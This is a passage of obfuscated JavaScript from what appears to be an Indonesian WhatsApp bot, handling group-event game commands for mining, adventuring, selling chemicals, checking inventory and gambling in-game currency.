_0x51e645(_0x5a5190,_0x187872);},'WjiUX':function(_0x295ec2,_0x1e24b3,_0x29e92d){return _0x295ec2(_0x1e24b3,_0x29e92d);},'wKDUd':'RESPONSE'};function _0x365686(_0x18c88e,_0x205ea7,_0x5b982d,_0x4534da){return _0x5b2460(_0x18c88e-0x1ed,_0x5b982d-0x122,_0x205ea7,_0x4534da-0x1f1);}const _0x2d7544=Math[_0x352a50(-0x7b,-0x28,-0x21,-0x50)](Math[_0x352a50(-0x8c,-0x14d,-0x117,-0x119)]()*(-0x12a7*-0x2+-0x98f*0x2+-0x1208)),_0x31a95a=Math[_0x365686(-0xc9,0x21,-0x69,-0xb5)](Math[_0x352a50(-0x133,-0x1a2,-0xd8,-0x119)]()*(0x1ba*0x3+0x45*0xb+0x1b*-0x4b));_0x295fe8[_0x365686(-0xa9,-0x7b,-0x77,-0x19)](addOre,sender,_0x2d7544),_0x295fe8[_0x352a50(-0x130,-0xf6,-0xcb,-0x92)](addStone,sender,_0x31a95a);const _0x5d30b1={};function _0x352a50(_0x328fde,_0x1a6372,_0x2056d5,_0x1b252d){return _0x1eb754(_0x328fde-0x1cc,_0x1b252d- -0x56d,_0x328fde,_0x1b252d-0xce);}_0x5d30b1[_0x352a50(-0x10b,-0x99,-0x102,-0x95)+'t']=_0x352a50(-0x7f,0x66,-0x3f,-0xc)+_0x352a50(-0xc2,-0x5e,-0x102,-0xd9);const _0x1bffe6={};_0x1bffe6[_0x352a50(0x97,-0x5b,0x35,0x0)]=_0x365686(-0x117,-0xa3,-0xe4,-0xeb),_0x1bffe6[_0x365686(-0xa9,-0xcf,-0x109,-0xc4)]=_0x5d30b1,_0x1bffe6['type']=_0x295fe8[_0x365686(-0xac,-0x17a,-0xe5,-0x72)];const _0x12651e={};_0x12651e[_0x352a50(0x22,0x26,0x17,0x8)]=mek,sendButImage(from,'*Congratul'+'ation\x20🎊*'+enter+enter+(_0x352a50(-0xca,-0x8d,-0xa4,-0x38)+'patkan\x20*')+_0x2d7544+(_0x352a50(-0x89,-0x29,-0x68,-0x2a)+_0x352a50(-0xf8,-0x95,-0xb,-0x8b))+_0x31a95a+_0x365686(-0x5e,-0x156,-0xfc,-0x167)+enter+enter+(_0x365686(-0x11e,-0x120,-0xd8,-0x85)+'ory\x20anda\x20d'+'engan\x20cara'+_0x352a50(-0x64,-0x22,-0x31,-0x97))+prefix+'inventory',botname+_0x352a50(-0x6e,0x3f,-0x41,0x15)+ownername,seye,[_0x1bffe6],_0x12651e);},-0x30*-0x5a+-0x1*-0x1e4e+-0xbd2*0x3),setTimeout(()=>{function _0x36f19c(_0x21bc95,_0x2315bc,_0x4b1aeb,_0xd74a02){return _0x5b2460(_0x21bc95-0x51,_0x2315bc-0xe3,_0x21bc95,_0xd74a02-0xb);}function _0x536602(_0x32e9c7,_0x5be619,_0x4c5598,_0xc79fd8){return _0x5b2460(_0x32e9c7-0xdc,_0x4c5598-0x5e6,_0xc79fd8,_0xc79fd8-0xee);}const _0x345d9c={'wkWli':function(_0x2a7f75,_0x5b6c25){return _0x2a7f75(_0x5b6c25);}};_0x345d9c[_0x36f19c(-0x86,-0x10e,-0x89,-0x190)](reply,_0x536602(0x402,0x4d6,0x4a4,0x445)+_0x536602(0x3dc,0x339,0x3d3,0x33a)+_0x536602(0x416,0x3f9,0x3ef,0x402)+_0x36f19c(-0xeb,-0x9a,-0x75,-0x17));},-0x26cb*0x1+-0x534+0x2bff);}else{if(tempsa===_0x1eb754(0x45d,0x4ac,0x47a,0x52a)+'ds'){const _0x2c3bcc={};_0x2c3bcc[_0x1eb754(0x44a,0x451,0x3ba,0x3c7)]='get',siae=await getBuffer(_0x1eb754(0x4c4,0x48d,0x433,0x435)+_0x1eb754(0x427,0x4a5,0x478,0x414)+_0x1eb754(0x4ca,0x4ec,0x539,0x53c)+_0x5b2460(-0x20f,-0x21d,-0x219,-0x27b)+_0x1eb754(0x476,0x47c,0x43c,0x406),_0x2c3bcc),setTimeout(()=>{const _0xf78d82={'TJMCu':function(_0x486ec5,_0x1e2df5){return _0x486ec5*_0x1e2df5;},'jOkWs':function(_0x45de25,_0x1e52ca,_0x380927){return _0x45de25(_0x1e52ca,_0x380927);},'GNeKq':function(_0x1e38ab,_0x342249,_0x416a5b,_0x6ef0f1,_0x977363,_0x106e24,_0x547423){return _0x1e38ab(_0x342249,_0x416a5b,_0x6ef0f1,_0x977363,_0x106e24,_0x547423);},'uHLqJ':_0x2727ec(-0xf0,-0x5e,-0x62,-0xcf)},_0x1195fc=Math[_0x4099e4(0x170,0xde,0x135,0xf0)](_0xf78d82['TJMCu'](Math[_0x4099e4(-0x49,-0x70,0xc3,0x27)](),-0x2*-0x752+-0x11b3+-0x369*-0x1)),_0x7a6549=Math['ceil'](Math[_0x2727ec(-0x103,-0x1a8,-0xa7,-0x125)]()*(0x1b41+0xa*-0x389+0x846));_0xf78d82['jOkWs'](addStone,sender,_0x1195fc);function _0x4099e4(_0xd840f5,_0x4438d6,_0x4d7a99,_0x256eb1){return _0x1eb754(_0xd840f5-0xb3,_0x256eb1- -0x42d,_0xd840f5,_0x256eb1-0x93);}function _0x2727ec(_0x311351,_0x442746,_0x4cfe87,_0x26af6f){return _0x5b2460(_0x311351-0x30,_0x26af6f-0x12f,_0x442746,_0x26af6f-0x4b);}addKayu(sender,_0x7a6549);const _0x203e1b={};_0x203e1b['displayTex'+'t']='My\x20Invento'+_0x4099e4(0x69,0x3a,-0x22,0x67);const _0x5eed2d={};_0x5eed2d['quoted']=mek,_0xf78d82[_0x2727ec(-0x152,-0xdd,-0x5a,-0xf5)](sendButImage,from,_0x4099e4(0x1aa,0xbd,0xc9,0x137)+'ation\x20🎊*'+enter+enter+(_0x2727ec(0x1b,0x38,0x42,-0x44)+_0x4099e4(0x10,0x5,0x8e,0x4e))+_0x1195fc+(_0x2727ec(0x3,0x6d,-0x49,-0x2c)+'\x20*')+_0x7a6549+_0x4099e4(0xfd,0x180,0x17c,0x15d)+enter+enter+(_0x4099e4(0x105,0x6c,0x6b,0x81)+_0x4099e4(0x1e,0x8,0xf6,0x55)+_0x2727ec(-0x6c,0x1d,0x6,-0x70)+_0x4099e4(0x9f,0xef,0x7c,0xa9))+prefix+_0x4099e4(0xbd,0x179,0x3a,0xd9),botname+_0x2727ec(0x1e,0x7d,0x7f,0x9)+ownername,siae,[{'buttonId':_0x4099e4(0xe2,0x93,0xac,0x75),'buttonText':_0x203e1b,'type':_0xf78d82[_0x2727ec(-0x7b,-0x3a,-0xd3,-0x31)]}],_0x5eed2d);},-0x1*0xdc2+-0x20b9*0x1+-0x2f*-0x13d),setTimeout(()=>{const _0xeac79a={'HwNEp':function(_0x403d8e,_0xa144ba){return _0x403d8e(_0xa144ba);},'nBVZJ':_0xb08ffe(0x39c,0x3aa,0x3da,0x434)+_0xb08ffe(0x287,0x26e,0x309,0x2a7)+_0x440681(0x1fc,0x2f2,0x2d6,0x298)+_0xb08ffe(0x3fb,0x363,0x39f,0x34e)};function _0xb08ffe(_0x56c813,_0x59cd30,_0x378cd7,_0x3d2663){return _0x1eb754(_0x56c813-0x180,_0x378cd7- -0x18c,_0x3d2663,_0x3d2663-0xb8);}function _0x440681(_0x286ea1,_0x16e9b9,_0x133d2a,_0x1ab684){return _0x1eb754(_0x286ea1-0xec,_0x1ab684- -0x219,_0x286ea1,_0x1ab684-0x1c5);}_0xeac79a['HwNEp'](reply,_0xeac79a[_0xb08ffe(0x23c,0x34e,0x2c7,0x22f)]);},-0xcc8*0x1+-0x2f8+0xfc0);}else{if(tempsa===_0x5b2460(-0x299,-0x215,-0x1b2,-0x25e)+_0x1eb754(0x4bb,0x497,0x476,0x47d)){const _0x3f59d7={};_0x3f59d7[_0x5b2460(-0x2d8,-0x257,-0x1b8,-0x1d1)]=_0x1eb754(0x402,0x45a,0x3fe,0x4bc),bbbb=await getBuffer(_0x5b2460(-0x1f8,-0x21b,-0x21e,-0x253)+_0x1eb754(0x495,0x4a5,0x482,0x4cf)+_0x1eb754(0x42f,0x4a6,0x404,0x4d5)+_0x5b2460(-0x137,-0x180,-0x1e7,-0x15c)+'c4c0e.jpg',_0x3f59d7),setTimeout(()=>{const _0x1bd89b={'ccjax':function(_0x2f6001,_0x3d1321){return _0x2f6001*_0x3d1321;},'qAeTS':function(_0x48e63a,_0x23fc71){return _0x48e63a*_0x23fc71;},'dVWUR':function(_0x123243,_0x50fcea,_0x5f32d0){return _0x123243(_0x50fcea,_0x5f32d0);},'JodcF':function(_0x2f5b0d,_0x1fd9e0,_0x7bb032,_0x5ac690,_0x57cf43,_0x121950,_0xd2d2d9){return _0x2f5b0d(_0x1fd9e0,_0x7bb032,_0x5ac690,_0x57cf43,_0x121950,_0xd2d2d9);},'aTnmt':'My\x20Invento'+_0x57fa17(0x4e,-0x1e,-0x5d,-0xae),'fNtoh':'RESPONSE'};function _0x57fa17(_0x5f10db,_0x5cf606,_0x26114c,_0x571bd1){return _0x5b2460(_0x5f10db-0x1c1,_0x5cf606-0x1f6,_0x26114c,_0x571bd1-0x2e);}function _0x16ea49(_0x422a6b,_0x503428,_0x5b9c6b,_0x1b2bdb){return _0x1eb754(_0x422a6b-0x180,_0x1b2bdb- -0x77e,_0x422a6b,_0x1b2bdb-0x1e0);}const _0x3c8af0=Math[_0x57fa17(0x91,0x6b,0x62,0x98)](_0x1bd89b['ccjax'](Math[_0x16ea49(-0x304,-0x2e5,-0x33e,-0x32a)](),-0x2699+0x23e6+0x1b*0x21)),_0x53bb8c=Math['ceil'](_0x1bd89b[_0x16ea49(-0x25e,-0x24b,-0x1c1,-0x238)](Math[_0x57fa17(-0xe6,-0x5e,-0x24,-0x88)](),-0x1e1f+-0x1367*-0x2+-0x1*0x89b));_0x1bd89b['dVWUR'](addStone,sender,_0x3c8af0),addKayu(sender,_0x53bb8c);const _0x39787a={};_0x39787a[_0x57fa17(0xcc,0xc3,0xae,0xc9)]=mek,_0x1bd89b[_0x16ea49(-0x2a5,-0x36c,-0x2b3,-0x2fb)](sendButImage,from,_0x57fa17(0x112,0xb2,0xa6,0x90)+_0x16ea49(-0x1a8,-0x29d,-0x1d2,-0x20b)+enter+enter+(_0x16ea49(-0x25b,-0x2de,-0x1cf,-0x249)+'patkan\x20*')+_0x3c8af0+('*\x20batu\x20dan'+'\x20')+_0x53bb8c+_0x16ea49(-0x2a9,-0x1b9,-0x204,-0x257)+enter+enter+(_0x57fa17(0x6c,-0x4,0x6,0x9a)+'ory\x20anda\x20d'+_0x57fa17(0xa4,0x57,0x1,0x81)+'\x20ketik\x20')+prefix+_0x57fa17(0x63,0x54,0x7b,0xdc),botname+_0x16ea49(-0x1e2,-0x1e1,-0x1ce,-0x1fc)+ownername,bbbb,[{'buttonId':'inv','buttonText':{'displayText':_0x1bd89b['aTnmt']},'type':_0x1bd89b['fNtoh']}],_0x39787a);},0x90d*0x1+-0x2314*0x1+0x25bf),setTimeout(()=>{function _0x1919f8(_0x26aacb,_0x48a96c,_0xe2d34a,_0x2b97a0){return _0x1eb754(_0x26aacb-0x116,_0x48a96c- -0x1b8,_0x26aacb,_0x2b97a0-0x98);}function _0x37366b(_0x4bcfbc,_0x149646,_0x43d509,_0x362c05){return _0x1eb754(_0x4bcfbc-0x25,_0x149646- -0x352,_0x4bcfbc,_0x362c05-0x143);}reply(_0x1919f8(0x412,0x3ae,0x330,0x3c9)+_0x1919f8(0x345,0x2dd,0x2ac,0x345)+_0x37366b(0x1f4,0x15f,0x192,0x153)+_0x37366b(0x24a,0x1d9,0x245,0x1fd));},0x2*-0xe8a+0x138e+-0x986*-0x1);}else{const _0x1e3ee9={};_0x1e3ee9['method']=_0x5b2460(-0x228,-0x24e,-0x25c,-0x289),seae=await getBuffer(_0x5b2460(-0x27f,-0x21b,-0x201,-0x1fb)+_0x5b2460(-0x1cb,-0x203,-0x218,-0x278)+'ile/168577'+_0x1eb754(0x577,0x570,0x592,0x60b)+_0x5b2460(-0x1f2,-0x16a,-0x1dd,-0x1d1),_0x1e3ee9),tesk=_0x5b2460(-0x11c,-0x14c,-0x13c,-0xd6)+_0x1eb754(0x502,0x4f6,0x4c8,0x4ca)+_0x1eb754(0x4a9,0x45f,0x4e3,0x4b8)+_0x5b2460(-0x284,-0x1ef,-0x1b1,-0x1c6)+_0x5b2460(-0x18b,-0x1e2,-0x160,-0x231)+'ens\x20River\x0a'+'🔵\x20Cochher\x20'+_0x1eb754(0x58a,0x584,0x52c,0x60e)+_0x5b2460(-0x126,-0x179,-0x1da,-0x1cc)+_0x5b2460(-0xf8,-0x17f,-0x14e,-0x166)+_0x5b2460(-0x21b,-0x24b,-0x2d5,-0x2e9)+'🟢\x20Chiltawa'+_0x1eb754(0x4ed,0x4f4,0x58b,0x514)+'imingstall'+_0x5b2460(-0x1df,-0x241,-0x259,-0x277)+_0x5b2460(-0x223,-0x22e,-0x21c,-0x252)+_0x5b2460(-0x2ed,-0x250,-0x235,-0x262)+'xample\x20:\x0a-'+'\x20'+prefix+(_0x1eb754(0x495,0x4d7,0x4f0,0x4ff)+_0x1eb754(0x40e,0x46a,0x468,0x461)+'er\x0a\x0aSumber'+_0x1eb754(0x4f2,0x512,0x513,0x4d6)+_0x5b2460(-0x244,-0x1d6,-0x26e,-0x1e0)+_0x5b2460(-0x1f8,-0x195,-0x146,-0x237)+'tasynamege'+_0x1eb754(0x590,0x52e,0x4e5,0x56b)+_0x1eb754(0x50f,0x574,0x578,0x4d5)),alpha['sendMessag'+'e'](from,seae,image,{'thumbnail':seae,'quoted':mek,'caption':tesk});}}}}}}}break;case _0x5b2460(-0x238,-0x201,-0x1e8,-0x1cb):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5b2460(-0x184,-0x1ff,-0x224,-0x1d5)+'\x20sudah\x20hab'+_0x5b2460(-0x1fe,-0x182,-0x1ba,-0x14a)+_0x1eb754(0x4cb,0x4b0,0x43d,0x4a1)+prefix+(_0x1eb754(0x4b9,0x517,0x486,0x5a2)+_0x1eb754(0x4cb,0x4d1,0x4d1,0x440)+_0x5b2460(-0x114,-0x146,-0xc7,-0x160)));if(!isEventon)return reply(_0x1eb754(0x564,0x4eb,0x513,0x4ed)+'\x20belum\x20di\x20'+_0x5b2460(-0x1cd,-0x171,-0x133,-0xd6));setTimeout(()=>{const _0x1f4de0={'mIXVQ':function(_0x3fb627,_0x587407){return _0x3fb627*_0x587407;},'hmVZl':function(_0xf4be54,_0x42816f){return _0xf4be54*_0x42816f;},'wamIQ':function(_0x217db3,_0x40135a,_0x4d9e4e){return _0x217db3(_0x40135a,_0x4d9e4e);},'TtNZi':function(_0x3c0daf,_0x5c98a6,_0x44e503){return _0x3c0daf(_0x5c98a6,_0x44e503);},'mshxk':function(_0x5eeebb,_0x528802){return _0x5eeebb(_0x528802);}};function _0x36eefe(_0x139f62,_0x431989,_0x4ed28e,_0x48f6d5){return _0x1eb754(_0x139f62-0x51,_0x48f6d5- -0x359,_0x139f62,_0x48f6d5-0x1f2);}const _0x17fafd=Math['ceil'](_0x1f4de0[_0x36eefe(0xc7,0x16f,0x106,0x11d)](Math['random'](),0x5a2*-0x3+0x119*-0xe+0x20a8)),_0x5c2176=Math[_0x15ecdf(0x330,0x25c,0x2f2,0x2d1)](_0x1f4de0[_0x15ecdf(0x2cb,0x390,0x352,0x3b4)](Math['random'](),-0x99e+0x5a*-0x2f+-0x1a42*-0x1));function _0x15ecdf(_0x399c34,_0x1a4007,_0x2c3bb8,_0x45eeef){return _0x5b2460(_0x399c34-0x1d4,_0x2c3bb8-0x47d,_0x1a4007,_0x45eeef-0x17b);}const _0xe2d56d=Math[_0x36eefe(0x185,0x197,0x260,0x1c4)](_0x1f4de0[_0x15ecdf(0x2c9,0x2dd,0x352,0x341)](Math[_0x36eefe(0x13a,0x16f,0x80,0xfb)](),-0x1bbf+-0xbd2+0x279b));_0x1f4de0[_0x36eefe(0x1bd,0x22f,0x246,0x22d)](addStone,sender,_0x17fafd),addCoal(sender,_0x5c2176),_0x1f4de0[_0x15ecdf(0x30e,0x288,0x323,0x39a)](addOre,sender,_0xe2d56d),_0x1f4de0[_0x15ecdf(0x2b4,0x2bb,0x316,0x2f8)](reply,_0x15ecdf(0x3d9,0x375,0x339,0x34f)+'ation\x20🎊*'+enter+enter+(_0x36eefe(0xe5,0x168,0x18d,0x115)+_0x15ecdf(0x275,0x1fa,0x28a,0x28c))+_0x17fafd+_0x15ecdf(0x307,0x22d,0x2cc,0x2d2)+_0x5c2176+(_0x15ecdf(0x320,0x314,0x34c,0x3e8)+'an\x20*')+_0xe2d56d+_0x36eefe(0x14d,0x89,0x11c,0x114));},0x25fe+0x64b+-0x2091),setTimeout(()=>{function _0x462704(_0x40d2aa,_0x52bf40,_0x32f8b5,_0x4df5de){return _0x5b2460(_0x40d2aa-0x111,_0x4df5de- -0x8a,_0x32f8b5,_0x4df5de-0x15);}function _0x4d808a(_0x5d1da4,_0x4a5c56,_0x47c7d1,_0x52848f){return _0x5b2460(_0x5d1da4-0x75,_0x4a5c56-0x470,_0x47c7d1,_0x52848f-0x35);}const _0x5d9f32={'bjwkt':function(_0x351fbc,_0xb7afbc){return _0x351fbc(_0xb7afbc);},'WqqSJ':_0x462704(-0x272,-0x1b7,-0x1d9,-0x23d)+_0x4d808a(0x291,0x301,0x371,0x3a0)+_0x4d808a(0x2de,0x2c5,0x2fd,0x26f)+'ggu...'};_0x5d9f32[_0x4d808a(0x2ee,0x34d,0x30a,0x306)](reply,_0x5d9f32[_0x4d808a(0x327,0x334,0x32a,0x368)]);},0xbb7*-0x2+0x1a95+-0x10d*0x3);break;case _0x5b2460(-0x12c,-0x18d,-0x14b,-0x1fc):if(!isEventon)return reply(_0x5b2460(-0x149,-0x1cc,-0x22c,-0x192)+'a\x20bro,\x20tap'+'i\x20event\x20gr'+_0x1eb754(0x4ab,0x4ea,0x543,0x583)+_0x1eb754(0x426,0x4a0,0x476,0x4d1));setTimeout(()=>{const _0x4a70c4={'axUZO':function(_0xfc2c02,_0xebe88e){return _0xfc2c02*_0xebe88e;},'RNDzi':function(_0x15b866,_0x5b5498,_0x5f0ff3){return _0x15b866(_0x5b5498,_0x5f0ff3);},'NjMCU':function(_0x51088d,_0x72e1e){return _0x51088d(_0x72e1e);}};function _0x5af91d(_0x6b5260,_0x419ee0,_0xaecc90,_0x769ccb){return _0x5b2460(_0x6b5260-0x33,_0x419ee0-0x6b,_0xaecc90,_0x769ccb-0x1ae);}const _0x507dab=Math[_0x14e0a5(-0x54,0x5,-0x9b,-0x76)](_0x4a70c4[_0x5af91d(-0x138,-0xaa,-0x140,-0x46)](Math[_0x14e0a5(-0x162,-0xc4,-0x143,-0x3f)](),-0x4ac*-0x3+0x59*0x42+-0x24e2));_0x4a70c4[_0x14e0a5(-0x1c,0x8,0x9,-0x2)](addKayu,sender,_0x507dab);function _0x14e0a5(_0x4fe416,_0x640a70,_0x3531a9,_0x49667f){return _0x5b2460(_0x4fe416-0xd6,_0x640a70-0x190,_0x49667f,_0x49667f-0xaf);}_0x4a70c4[_0x5af91d(-0x182,-0x125,-0xeb,-0x17e)](reply,_0x5af91d(-0x11f,-0xd9,-0x9c,-0x4e)+_0x5af91d(-0x5a,-0xca,-0xe1,-0xe5)+enter+enter+(_0x5af91d(-0x1e7,-0x1cc,-0x1fd,-0x23d)+_0x5af91d(-0x223,-0x1c2,-0x1c9,-0x188))+_0x507dab+(_0x5af91d(-0x117,-0x1ac,-0x23c,-0x130)+'ma\x202\x20menit'));},0x5*0x13d+0xeb9+0xb*-0xd6),setTimeout(()=>{const _0x2d5451={'BMhqP':function(_0x2adb1d,_0x20bd95){return _0x2adb1d(_0x20bd95);},'WeGff':_0x424819(0x306,0x31f,0x362,0x269)+'ambang,\x20si'+_0x424819(0x30e,0x370,0x344,0x2ec)+_0x408741(0x251,0x1f3,0x238,0x24d)};function _0x408741(_0x2774ac,_0x56289c,_0x16eee9,_0x482fac){return _0x5b2460(_0x2774ac-0x106,_0x2774ac-0x367,_0x56289c,_0x482fac-0x128);}function _0x424819(_0x2fd744,_0x277c60,_0x5b66b7,_0x122e42){return _0x1eb754(_0x2fd744-0x1b8,_0x2fd744- -0x1ef,_0x5b66b7,_0x122e42-0x52);}_0x2d5451[_0x408741(0x17a,0x103,0x1e8,0x15d)](reply,_0x2d5451[_0x408741(0x1d9,0x177,0x22b,0x205)]);},-0x1cb2+-0x22c6*0x1+-0x4*-0xfde);break;case _0x5b2460(-0x249,-0x238,-0x21d,-0x239):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x425,0x4a9,0x443,0x4ee)+_0x5b2460(-0x1a6,-0x216,-0x284,-0x261)+_0x5b2460(-0x127,-0x182,-0x117,-0x1e4)+_0x1eb754(0x41b,0x4b0,0x452,0x500)+prefix+('limit\x20untu'+_0x5b2460(-0x237,-0x1d7,-0x207,-0x1d2)+'\x20limit'));if(!isEventon)return reply(_0x1eb754(0x465,0x4eb,0x49c,0x52e)+_0x5b2460(-0xbe,-0x132,-0x17c,-0x15d)+_0x5b2460(-0x1b0,-0x171,-0xf4,-0x19b));setTimeout(()=>{function _0x599b29(_0x4a7843,_0x63c01f,_0x477f3d,_0x3d0744){return _0x5b2460(_0x4a7843-0x11a,_0x4a7843- -0x38,_0x63c01f,_0x3d0744-0xd);}function _0x18507c(_0x22ff7f,_0x169221,_0x1ca8f1,_0x21e34d){return _0x5b2460(_0x22ff7f-0xec,_0x21e34d-0x593,_0x1ca8f1,_0x21e34d-0x150);}const _0x1dbae7={'PxilW':_0x18507c(0x43f,0x43e,0x3ea,0x3f5),'kBgtb':_0x18507c(0x436,0x347,0x44c,0x3cc),'huHVl':'jupiter','zkUmz':_0x599b29(-0x21e,-0x2b2,-0x1b7,-0x269),'UCgFg':_0x599b29(-0x197,-0x1ef,-0x1fd,-0x16d),'bUmHS':_0x599b29(-0x27f,-0x319,-0x206,-0x27c),'YXVkJ':function(_0x3374d1,_0x418f82,_0x4165cd){return _0x3374d1(_0x418f82,_0x4165cd);}},_0x3226f2=Math[_0x18507c(0x4a9,0x376,0x471,0x408)](Math[_0x18507c(0x3dc,0x32b,0x332,0x33f)]()*(-0x36c+0x596+-0x1c6)),_0x1e9787=[_0x1dbae7['PxilW'],'venus',_0x1dbae7['kBgtb'],_0x1dbae7['huHVl'],_0x1dbae7[_0x18507c(0x4ac,0x3d3,0x3df,0x40a)],_0x1dbae7['UCgFg'],_0x1dbae7[_0x599b29(-0x1fc,-0x199,-0x23f,-0x179)]],_0x401df0=_0x1e9787[Math[_0x18507c(0x40c,0x368,0x333,0x385)](Math['random']()*_0x1e9787[_0x599b29(-0x199,-0x14a,-0x19b,-0x1fa)])];_0x1dbae7[_0x599b29(-0x1e6,-0x188,-0x1a7,-0x147)](addPlanet,sender,_0x3226f2),reply(_0x18507c(0x3b5,0x3f7,0x3ad,0x44f)+_0x599b29(-0x16d,-0x208,-0x1f1,-0x16e)+enter+enter+('kamu\x20menda'+_0x599b29(-0x265,-0x2ac,-0x1fa,-0x1ea))+_0x3226f2+('*bahan\x20kim'+_0x18507c(0x492,0x481,0x35e,0x3fb))+_0x401df0+(_0x18507c(0x43c,0x463,0x412,0x42b)+_0x599b29(-0x212,-0x1b7,-0x1b4,-0x17e)));},0x832+-0x844+0xbca),setTimeout(()=>{function _0x4491b4(_0x128695,_0x4dc5e6,_0x41796f,_0x4dcc1e){return _0x1eb754(_0x128695-0xc0,_0x41796f- -0x11e,_0x128695,_0x4dcc1e-0x28);}const _0x9e0938={'opsNm':function(_0x54bfef,_0x1da12b){return _0x54bfef(_0x1da12b);},'rtpJp':'Sedang\x20ber'+'tualang,\x20s'+_0x4491b4(0x2f1,0x307,0x37d,0x2f1)+_0x3dbf07(0x46b,0x437,0x429,0x41c)+'tahun'};function _0x3dbf07(_0x52ac70,_0x1f442c,_0x1d0724,_0x29bc3b){return _0x5b2460(_0x52ac70-0x179,_0x1d0724-0x5d0,_0x29bc3b,_0x29bc3b-0xd8);}_0x9e0938[_0x3dbf07(0x4b8,0x3aa,0x446,0x3ea)](reply,_0x9e0938[_0x4491b4(0x39c,0x3d2,0x434,0x40f)]);},-0x6aa*-0x5+0xd83*0x2+-0x3c58);break;case _0x5b2460(-0xde,-0x158,-0x132,-0x136)+_0x5b2460(-0x1a5,-0x148,-0x192,-0xd2):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu'+_0x1eb754(0x45c,0x492,0x4ef,0x45f)+'is\x20silahka'+_0x1eb754(0x48a,0x4b0,0x50f,0x490)+prefix+(_0x1eb754(0x5b1,0x517,0x493,0x56d)+_0x5b2460(-0x216,-0x1d7,-0x191,-0x17d)+_0x5b2460(-0x1db,-0x146,-0x10b,-0x15b)));if(!isEventon)return reply(_0x1eb754(0x555,0x4eb,0x45a,0x584)+_0x1eb754(0x601,0x576,0x541,0x50a)+'aktifkan');buayar=body[_0x5b2460(-0x285,-0x246,-0x24a,-0x277)](0x1*-0x1822+-0x1121*0x2+0x204*0x1d);const hargakimia=0x26a7+0x6d*-0x4b+-0x2d0,dapetin=buayar*hargakimia;if(getBertualangPlanet(sender)<=-0x16*0x37+-0x1f0b+-0x13*-0x1e2)return reply(_0x1eb754(0x528,0x4de,0x50a,0x44f)+pushname+(_0x1eb754(0x45e,0x4b3,0x436,0x544)+_0x5b2460(-0x98,-0x125,-0xf5,-0x187)+_0x5b2460(-0x188,-0x1f0,-0x1d5,-0x22d)));getBertualangPlanet(sender)>=0x149c+0x1ed8+-0x3373&&(jualbahankimia(sender,buayar),addKoinUser(sender,dapetin),await reply('*「\x20PENJUAL'+'AN\x20BERHASI'+_0x1eb754(0x4f1,0x504,0x555,0x4b6)+enter+enter+(_0x1eb754(0x44e,0x466,0x3d0,0x4ff)+_0x1eb754(0x421,0x459,0x4e5,0x3e9)+_0x5b2460(-0x266,-0x1df,-0x22b,-0x1be))+buayar+enter+(_0x5b2460(-0x25c,-0x258,-0x2dd,-0x1c5)+_0x1eb754(0x57d,0x580,0x51f,0x562))+dapetin+enter+enter+(_0x1eb754(0x562,0x58b,0x5fc,0x528)+_0x1eb754(0x51b,0x55e,0x4e3,0x520))+getBertualangPlanet(sender)+enter+(_0x5b2460(-0x14f,-0x120,-0x15a,-0x133)+':*\x20')+checkATMuser(sender)+enter+enter+(_0x1eb754(0x4f4,0x4ab,0x463,0x438)+_0x5b2460(-0x1cf,-0x20a,-0x2a3,-0x219)+_0x5b2460(-0x228,-0x1bf,-0x1b1,-0x12f)+_0x1eb754(0x522,0x48c,0x477,0x44a)+_0x5b2460(-0x245,-0x218,-0x285,-0x282)+'ak1920kal')));break;case _0x1eb754(0x45f,0x452,0x428,0x3e5)+_0x5b2460(-0xf9,-0x148,-0xcd,-0xae):teks=_0x1eb754(0x414,0x466,0x488,0x4c0)+_0x1eb754(0x419,0x468,0x4ad,0x4b4)+_0x1eb754(0x505,0x53f,0x586,0x4e2)+_0x5b2460(-0x1fd,-0x17b,-0x184,-0x1d5)+pushname+(_0x5b2460(-0x2cf,-0x22f,-0x23f,-0x23d)+'\x0a\x0a*_')+getBertualangPlanet(sender)+'_*';const _0x4a3e1f={};_0x4a3e1f[_0x1eb754(0x547,0x575,0x558,0x5e9)]=mek,alpha[_0x5b2460(-0x154,-0x192,-0x1a1,-0x1a5)+'e'](from,teks,text,_0x4a3e1f);break;case _0x5b2460(-0x232,-0x1d5,-0x240,-0x1b6):case _0x1eb754(0x565,0x4fb,0x4e9,0x466):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x4c6,0x4a9,0x4f2,0x453)+'\x20sudah\x20hab'+_0x5b2460(-0x17f,-0x182,-0x19a,-0x153)+_0x1eb754(0x423,0x4b0,0x4f3,0x503)+prefix+(_0x1eb754(0x551,0x517,0x56f,0x4c7)+_0x5b2460(-0x1e7,-0x1d7,-0x26a,-0x1d2)+_0x1eb754(0x533,0x562,0x5a7,0x53f)));if(!isEventon)return reply('Event\x20grub'+_0x1eb754(0x588,0x576,0x5b7,0x5ec)+'aktifkan');cas=body[_0x5b2460(-0x2cd,-0x246,-0x2db,-0x276)](-0x21*0xeb+0x1df5+0x2e*0x2);if(checkATMuser(sender)<cas)return reply(_0x5b2460(-0x118,-0x145,-0x18b,-0x139)+_0x1eb754(0x4de,0x4c3,0x4e9,0x525)+_0x1eb754(0x4c1,0x55b,0x4bd,0x555)+_0x1eb754(0x563,0x4c7,0x522,0x4be)+_0x1eb754(0x44b,0x4d3,0x459,0x571));if(args[_0x1eb754(0x579,0x547,0x5a2,0x54b)]<0x13bc+-0x250e+-0x5*-0x377)return reply(_0x1eb754(0x5d0,0x56b,0x563,0x4fb)+_0x5b2460(-0x185,-0x129,-0x1c0,-0x9f));if(isNaN(cas))return reply(_0x5b2460(-0x26d,-0x212,-0x27b,-0x29b)+_0x1eb754(0x54e,0x4c1,0x552,0x4c4));const resg=[_0x1eb754(0x51d,0x4e7,0x506,0x489)+_0x5b2460(-0x12c,-0x151,-0x126,-0xee),'Kamu\x20KALAH'+'!!'];bayar=confirmATM(sender,cas),setTimeout(()=>{function _0x58a7fb(_0x362b02,_0x25a1a3,_0x1afad3,_0x2bcd2a){return _0x5b2460(_0x362b02-0x98,_0x1afad3-0x58a,_0x362b02,_0x2bcd2a-0xb9);}const _0x485672={'GJPag':function(_0xd7b851,_0x46dbc4){return _0xd7b851*_0x46dbc4;},'pGQbE':function(_0x5b165e,_0x276bb9){return _0x5b165e+_0x276bb9;},'unBYx':function(_0x23985b,_0x3be72d){return _0x23985b==_0x3be72d;},'oCPqx':function(_0x59613d,_0x4e6bda,_0x2edfb5){return 